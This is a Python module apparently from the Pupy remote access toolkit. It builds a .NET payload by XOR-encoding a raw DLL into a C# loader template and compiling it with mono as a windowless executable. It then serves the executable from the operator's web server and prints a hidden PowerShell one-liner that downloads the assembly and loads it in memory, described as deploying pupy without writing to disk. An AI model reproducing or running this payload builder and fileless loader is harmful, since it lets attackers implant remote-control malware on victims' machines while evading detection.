# -*- coding: utf-8 -*-
#Author: @n1nj4sec
#Contributor(s):

import os
import subprocess
import tempfile
import random

from string import ascii_uppercase, ascii_lowercase
from os.path import join, splitext

from pupylib.PupyOutput import Success, Error, List
from pupylib import ROOT

TEMPLATE = join(ROOT, 'payload_templates', 'PupyLoaderTemplate.cs')

class DotNetPayload(object):
    def __init__(self, display, server, conf, rawdll, outpath=None, output_dir=None):
        self.server = server
        self.display = display
        self.conf = conf
        self.outpath = outpath
        self.output_dir = output_dir
        self.rawdll = rawdll

    def gen_source(self, random_path=False):
        with open(TEMPLATE, 'rb') as f:
            template_source = f.read()

        self.display(Success('packing pupy into C# source ...'))

        encoded = '{' + ','.join(str(ord(c)^0xFF) for c in self.rawdll) + '}'
        content = template_source.replace('<PUPYx64_BYTES>', encoded)

        if not self.outpath or random_path:
            outfile = tempfile.NamedTemporaryFile(
                dir=self.output_dir or '.',
                prefix='pupy_',
                suffix='.cs',
                delete=False
            )
        else:
            outpath_src, _ = splitext(self.outpath) + '.cs'
            outfile = open(outpath_src, 'w')

        outfile.write(content)
        outfile.close()
        return outfile.name

    def gen_exe(self):
        sourcepath = self.gen_source(random_path=True)

        if not self.outpath:
            outfile = os.path.join(
                self.output_dir or '.', 'pupy_'+''.join(
                    random.choice(
                        ascii_uppercase + ascii_lowercase) for _ in range(8)) + '.exe')
        else:
            outfile = self.outpath

        try:
            command = ['mcs']

            if not self.conf.get('debug', False):
                command.append('-target:winexe')

            sdk = self.server.config.get('gen', 'mcs_sdk', 4)

            command.extend([
                '-unsafe',
                '-sdk:{}'.format(sdk),
                '-OUT:{}'.format(outfile),
                sourcepath
            ])

            self.display(Success('compiling via mono command: {}'.format(' '.join(command))))

            try:
                output = subprocess.check_output(command).strip()
                if output:
                    self.display(output)

            except subprocess.CalledProcessError as e:
                self.display(Error('Mono compilation failed: {}'.format(e.output)))
                return None

            except OSError:
                self.display(Error("mcs compiler can't be found ... install mono-mcs package"))
                return None

        finally:
            os.unlink(sourcepath)

        return outfile


def dotnet_serve_payload(display, server, rawdll, conf, link_ip="<your_ip>"):
    if not server:
        display(Error('Oneliners only supported from pupysh'))
        return

    if not server.pupweb:
        display(Error('Webserver disabled'))
        return

    dn = DotNetPayload(display, server, conf, rawdll)
    exe_path = dn.gen_exe()

    with open(exe_path, 'rb') as r:
        payload = r.read()

    os.unlink(exe_path)

    landing_uri = server.pupweb.serve_content(payload, alias='.NET payload')

    display(List([
        "powershell -w hidden -c \"[Reflection.Assembly]::Load("
                  "(new-object net.webclient).DownloadData("
                  "'http://{}:{}{}')).GetTypes()[0].GetMethods("
                  ")[0].Invoke($null,@())\"".format(
            link_ip, server.pupweb.port, landing_uri),
    ], caption=Success(
        'Copy/paste this one-line loader to deploy pupy without writing on the disk')))
